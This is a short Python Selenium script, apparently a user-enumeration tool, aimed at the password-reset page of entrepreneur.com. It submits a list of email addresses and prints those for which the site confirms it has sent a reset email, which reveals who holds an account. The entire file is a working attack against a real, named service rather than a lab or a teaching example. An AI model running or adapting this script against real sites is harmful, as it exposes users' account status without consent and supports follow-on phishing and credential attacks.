# User Enum Entrepreneur
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from time import sleep
import extract_html_diff

print("The usernames present in Entrepreneur are:")

# Place all the Email IDs to test in the for loop as shown below.
# You can remove all the Email IDs below
for i in ["superman@gmail.com", "yenojam209@shzsedu.com", "priyasdsdanka@gmail.com", "batman@gmail.com", "asjdbkajsdnkjas@gmail.com", "spiderman@gmail.com"]:
    user = i

    # Using edge browser
    driver = webdriver.Edge(executable_path='msedgedriver')

    # Using Firefox browser
    # driver = webdriver.FirefoxProfile()
    # driver = webdriver.Firefox(driver)

    driver.get("https://www.entrepreneur.com/dashboard/forgot")
    p1 = driver.page_source
    sleep(3)
    elem=driver.find_element_by_xpath("//input[@type='email']")
    elem.send_keys(user)
    elem.send_keys(Keys.RETURN)
    sleep(2)
    p2 = driver.page_source
    p3 = extract_html_diff.as_string(p2, p1)

    if "We just sent you an email with instructions to reset your password" in p3:
        print(i)
    sleep(2)
    driver.close()
